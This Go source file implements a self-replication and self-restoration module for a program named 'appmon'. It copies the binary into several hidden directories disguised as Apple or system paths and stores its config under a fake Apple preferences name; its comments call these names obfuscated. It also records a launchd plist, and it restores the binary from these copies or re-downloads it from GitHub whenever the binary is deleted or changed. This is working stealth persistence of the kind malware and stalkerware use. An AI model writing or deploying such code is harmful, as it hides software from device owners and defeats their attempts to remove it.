package infra

import (
	"crypto/md5"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"

	"go.uber.org/zap"
)

// BackupConfig stores information about binary backups
type BackupConfig struct {
	MainBinaryPath string   `json:"main_binary_path"`
	SHA256         string   `json:"sha256"`
	BackupPaths    []string `json:"backup_paths"`
	PlistPath      string   `json:"plist_path"`
	Version        string   `json:"version"`
	BuildTime      string   `json:"build_time"`
	ExecMode       string   `json:"exec_mode"` // "user" or "system"
}

// BackupManager handles binary self-replication and restoration
// Implements hybrid backup: local copies + GitHub release download
type BackupManager struct {
	homeDir    string
	configPath string
	downloader *GitHubDownloader
	logger     *zap.Logger
}

// NewBackupManager creates a new backup manager
func NewBackupManager() *BackupManager {
	home, _ := os.UserHomeDir()
	return NewBackupManagerWithHome(home)
}

// NewBackupManagerWithHome creates a backup manager with custom home directory (for testing)
func NewBackupManagerWithHome(home string) *BackupManager {
	// Hidden config location - obfuscated name
	hostname, _ := os.Hostname()
	hash := md5.Sum([]byte("appmon-backup-cfg-" + hostname))
	configDir := filepath.Join(home, ".config", ".com.apple.preferences."+hex.EncodeToString(hash[:])[:6])

	logger, _ := zap.NewProduction()

	return &BackupManager{
		homeDir:    home,
		configPath: filepath.Join(configDir, ".helper.json"),
		downloader: NewGitHubDownloader(),
		logger:     logger,
	}
}

// NewBackupManagerWithLogger creates a backup manager with a custom logger
func NewBackupManagerWithLogger(home string, logger *zap.Logger) *BackupManager {
	bm := NewBackupManagerWithHome(home)
	bm.logger = logger
	return bm
}

// getBackupLocations returns obfuscated backup directory paths
func (bm *BackupManager) getBackupLocations() []string {
	hostname, _ := os.Hostname()

	// Generate different hashes for different locations
	hash1 := md5.Sum([]byte("appmon-bk1-" + hostname))
	hash2 := md5.Sum([]byte("appmon-bk2-" + hostname))
	hash3 := md5.Sum([]byte("appmon-bk3-" + hostname))

	return []string{
		// Hidden in .config
		filepath.Join(bm.homeDir, ".config", ".com.apple.helper."+hex.EncodeToString(hash1[:])[:8]),
		// Hidden in .local/share
		filepath.Join(bm.homeDir, ".local", "share", ".system.cache."+hex.EncodeToString(hash2[:])[:8]),
		// Hidden in /var/tmp
		filepath.Join("/var/tmp", ".cf_service_"+hex.EncodeToString(hash3[:])[:8]),
	}
}

// SetupBackups copies the current binary to backup locations
func (bm *BackupManager) SetupBackups(mainBinaryPath, version, buildTime string) error {
	return bm.SetupBackupsWithMode(mainBinaryPath, version, buildTime, ExecModeUser)
}

// SetupBackupsWithMode copies the current binary to backup locations with exec mode
func (bm *BackupManager) SetupBackupsWithMode(mainBinaryPath, version, buildTime string, mode ExecMode) error {
	// Compute SHA256 of main binary
	sha, err := computeSHA256(mainBinaryPath)
	if err != nil {
		return fmt.Errorf("failed to compute SHA256: %w", err)
	}

	backupPaths := bm.getBackupLocations()
	successfulBackups := []string{}

	// Copy to each backup location
	for _, backupDir := range backupPaths {
		// Create directory
		if err := os.MkdirAll(backupDir, 0700); err != nil {
			continue // Try next location
		}

		// Binary name is also obfuscated
		backupPath := filepath.Join(backupDir, ".helper")

		if err := copyFile(mainBinaryPath, backupPath); err != nil {
			continue
		}

		// Make executable
		_ = os.Chmod(backupPath, 0700)
		successfulBackups = append(successfulBackups, backupPath)
	}

	if len(successfulBackups) == 0 {
		return fmt.Errorf("failed to create any backups")
	}

	// Determine plist path based on mode
	var plistPath string
	label := GetLaunchdLabel()
	if mode == ExecModeSystem {
		plistPath = "/Library/LaunchDaemons/" + label + ".plist"
	} else {
		plistPath = filepath.Join(bm.homeDir, "Library/LaunchAgents", label+".plist")
	}

	// Save config
	config := BackupConfig{
		MainBinaryPath: mainBinaryPath,
		SHA256:         sha,
		BackupPaths:    successfulBackups,
		PlistPath:      plistPath,
		Version:        version,
		BuildTime:      buildTime,
		ExecMode:       string(mode),
	}

	return bm.saveConfig(config)
}

// GetConfig loads the backup configuration
func (bm *BackupManager) GetConfig() (*BackupConfig, error) {
	data, err := os.ReadFile(bm.configPath)
	if err != nil {
		return nil, err
	}

	var config BackupConfig
	if err := json.Unmarshal(data, &config); err != nil {
		return nil, err
	}

	return &config, nil
}

// saveConfig writes config to hidden location
func (bm *BackupManager) saveConfig(config BackupConfig) error {
	// Ensure config directory exists
	configDir := filepath.Dir(bm.configPath)
	if err := os.MkdirAll(configDir, 0700); err != nil {
		return err
	}

	data, err := json.Marshal(config)
	if err != nil {
		return err
	}

	return os.WriteFile(bm.configPath, data, 0600)
}

// VerifyAndRestore checks binary integrity and restores if needed
// Uses hybrid approach: try local backups first, then GitHub as fallback
func (bm *BackupManager) VerifyAndRestore() (restored bool, err error) {
	config, err := bm.GetConfig()
	if err != nil {
		return false, fmt.Errorf("no backup config found: %w", err)
	}

	// Check if main binary exists
	if _, statErr := os.Stat(config.MainBinaryPath); os.IsNotExist(statErr) {
		// Binary MISSING → restore (local first, then GitHub)
		return bm.restoreWithFallback(config)
	}

	// Binary exists - check SHA256
	currentSHA, err := computeSHA256(config.MainBinaryPath)
	if err != nil {
		// Can't compute SHA → try to restore
		return bm.restoreWithFallback(config)
	}

	if currentSHA == config.SHA256 {
		// SHA matches → all good
		return false, nil
	}

	// SHA mismatch - check if it's a legitimate update by comparing versions
	currentVersion, err := bm.queryBinaryVersion(config.MainBinaryPath)
	if err != nil {
		// Can't query version → assume corruption, restore
		return bm.restoreWithFallback(config)
	}

	// Compare versions
	if isNewerVersion(currentVersion, config.Version) {
		// Newer version → legitimate update, update backups
		mode := ExecMode(config.ExecMode)
		if mode == "" {
			mode = ExecModeUser
		}
		return false, bm.SetupBackupsWithMode(config.MainBinaryPath, currentVersion, "", mode)
	}

	// Same or older version with different SHA → corruption, restore
	return bm.restoreWithFallback(config)
}

// restoreWithFallback tries local backups first, then GitHub download
func (bm *BackupManager) restoreWithFallback(config *BackupConfig) (bool, error) {
	// Try local backups first
	restored, err := bm.restoreFromLocalBackup(config)
	if restored {
		if bm.logger != nil {
			bm.logger.Info("restored binary from local backup")
		}
		return true, nil
	}

	if bm.logger != nil {
		bm.logger.Warn("local backup restore failed, trying GitHub download", zap.Error(err))
	}

	// Local backups failed, try GitHub download
	restored, err = bm.restoreFromGitHub(config)
	if err != nil {
		return false, fmt.Errorf("all restore methods failed: %w", err)
	}

	return restored, nil
}

// restoreFromLocalBackup restores the main binary from a valid local backup
func (bm *BackupManager) restoreFromLocalBackup(config *BackupConfig) (bool, error) {
	for _, backupPath := range config.BackupPaths {
		backupSHA, err := computeSHA256(backupPath)
		if err != nil || backupSHA != config.SHA256 {
			continue // This backup is corrupted or missing
		}

		// Found good backup, restore it
		_ = os.MkdirAll(filepath.Dir(config.MainBinaryPath), 0755)

		if err := copyFile(backupPath, config.MainBinaryPath); err != nil {
			continue
		}
		_ = os.Chmod(config.MainBinaryPath, 0755)
		return true, nil
	}
	return false, fmt.Errorf("all local backups corrupted or missing")
}

// restoreFromGitHub downloads latest binary from GitHub and restores it
func (bm *BackupManager) restoreFromGitHub(config *BackupConfig) (bool, error) {
	if bm.logger != nil {
		bm.logger.Info("downloading latest release from GitHub")
	}

	// Download to temp location
	tmpPath, err := bm.downloader.DownloadToTemp()
	if err != nil {
		return false, fmt.Errorf("GitHub download failed: %w", err)
	}
	defer os.RemoveAll(filepath.Dir(tmpPath))

	// Ensure destination directory exists
	if mkdirErr := os.MkdirAll(filepath.Dir(config.MainBinaryPath), 0755); mkdirErr != nil {
		return false, fmt.Errorf("failed to create binary directory: %w", mkdirErr)
	}

	// Copy to main binary location
	if copyErr := copyFile(tmpPath, config.MainBinaryPath); copyErr != nil {
		return false, fmt.Errorf("failed to copy downloaded binary: %w", copyErr)
	}
	_ = os.Chmod(config.MainBinaryPath, 0755)

	if bm.logger != nil {
		bm.logger.Info("restored binary from GitHub release")
	}

	// Update local backups with the new binary
	newSHA, err := computeSHA256(config.MainBinaryPath)
	if err != nil {
		if bm.logger != nil {
			bm.logger.Warn("failed to compute SHA of restored binary", zap.Error(err))
		}
	} else {
		// Update config with new SHA and refresh local backups
		version, _ := bm.downloader.GetLatestVersion()
		mode := ExecMode(config.ExecMode)
		if mode == "" {
			mode = ExecModeUser
		}

		if err := bm.SetupBackupsWithMode(config.MainBinaryPath, version, "", mode); err != nil {
			if bm.logger != nil {
				bm.logger.Warn("failed to update local backups after GitHub restore", zap.Error(err))
			}
		} else {
			if bm.logger != nil {
				bm.logger.Info("updated local backups with downloaded binary",
					zap.String("sha256", newSHA[:16]+"..."),
					zap.String("version", version))
			}
		}
	}

	return true, nil
}

// queryBinaryVersion runs the binary with "version --json" to get its version
func (bm *BackupManager) queryBinaryVersion(binaryPath string) (string, error) {
	cmd := exec.Command(binaryPath, "version", "--json")
	output, err := cmd.Output()
	if err != nil {
		return "", fmt.Errorf("failed to query version: %w", err)
	}

	var info struct {
		Version string `json:"version"`
	}
	if err := json.Unmarshal(output, &info); err != nil {
		return "", fmt.Errorf("failed to parse version: %w", err)
	}
	return info.Version, nil
}

// isNewerVersion compares two semver strings, returns true if current > stored
// Simple comparison: splits by "." and compares each part numerically
func isNewerVersion(current, stored string) bool {
	if stored == "" {
		return true // No stored version → treat current as newer
	}

	currentParts := strings.Split(current, ".")
	storedParts := strings.Split(stored, ".")

	// Compare each part
	maxLen := len(currentParts)
	if len(storedParts) > maxLen {
		maxLen = len(storedParts)
	}

	for i := 0; i < maxLen; i++ {
		var currentNum, storedNum int

		if i < len(currentParts) {
			currentNum, _ = strconv.Atoi(currentParts[i])
		}
		if i < len(storedParts) {
			storedNum, _ = strconv.Atoi(storedParts[i])
		}

		if currentNum > storedNum {
			return true
		}
		if currentNum < storedNum {
			return false
		}
	}

	return false // Equal versions
}

// GetMainBinaryPath returns the configured main binary path
func (bm *BackupManager) GetMainBinaryPath() string {
	config, err := bm.GetConfig()
	if err != nil {
		// Default location if no config
		return filepath.Join(bm.homeDir, ".local", "bin", "appmon")
	}
	return config.MainBinaryPath
}

// computeSHA256 calculates SHA256 hash of a file
func computeSHA256(path string) (string, error) {
	f, err := os.Open(path)
	if err != nil {
		return "", err
	}
	defer f.Close()

	h := sha256.New()
	if _, err := io.Copy(h, f); err != nil {
		return "", err
	}

	return hex.EncodeToString(h.Sum(nil)), nil
}

// copyFile copies a file from src to dst using atomic write pattern.
// Writes to temp file first, syncs, then renames to avoid corruption.
func copyFile(src, dst string) error {
	sourceFile, err := os.Open(src)
	if err != nil {
		return err
	}
	defer sourceFile.Close()

	// Create temp file in same directory for atomic rename
	dstDir := filepath.Dir(dst)
	tmpFile, err := os.CreateTemp(dstDir, ".appmon-copy-*")
	if err != nil {
		return err
	}
	tmpPath := tmpFile.Name()

	// Clean up temp file on any error
	success := false
	defer func() {
		if !success {
			os.Remove(tmpPath)
		}
	}()

	// Copy content
	if _, err = io.Copy(tmpFile, sourceFile); err != nil {
		tmpFile.Close()
		return err
	}

	// Sync to disk before rename
	if err = tmpFile.Sync(); err != nil {
		tmpFile.Close()
		return err
	}
	tmpFile.Close()

	// Atomic rename
	if err = os.Rename(tmpPath, dst); err != nil {
		return err
	}

	success = true
	return nil
}
